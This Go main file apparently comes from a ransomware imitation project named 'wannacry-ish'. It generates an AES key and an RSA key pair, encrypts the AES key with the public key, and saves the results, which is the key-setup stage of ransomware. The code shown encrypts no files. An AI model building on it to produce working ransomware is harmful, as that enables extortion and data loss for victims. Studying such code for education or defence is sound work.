package main

import (
	"fmt"

	"github.com/J4NN0/wannacry-ish/internal/key"
)

func main() {
	fmt.Printf("Generating AES key ...\n")
	aesKey, err := key.GenerateAESKey()
	if err != nil {
		fmt.Printf("Failed to generate AES key: %v", err)
		return
	}

	fmt.Printf("Generating RSA key pair ...\n")
	rsaPrivateKey, rsaPublicKey, err := key.GenerateRSAKeyPair()
	if err != nil {
		fmt.Printf("Failed to generate RSA key pair: %v", err)
		return
	}

	encryptedKey, err := key.EncryptAESKey(aesKey, rsaPublicKey)
	if err != nil {
		fmt.Printf("Failed to crypto AES key pair: %v", err)
		return
	}

	err = key.SaveEncryptedAESKey(encryptedKey)
	if err != nil {
		fmt.Printf("Failed to store AES encrypted key: %v", err)
		return
	}

	err = key.SavePrivateKey(rsaPrivateKey)
	if err != nil {
		fmt.Printf("Failed to store RSA private key: %v", err)
		return
	}

	fmt.Printf("Keys stored succesfully\n")
}
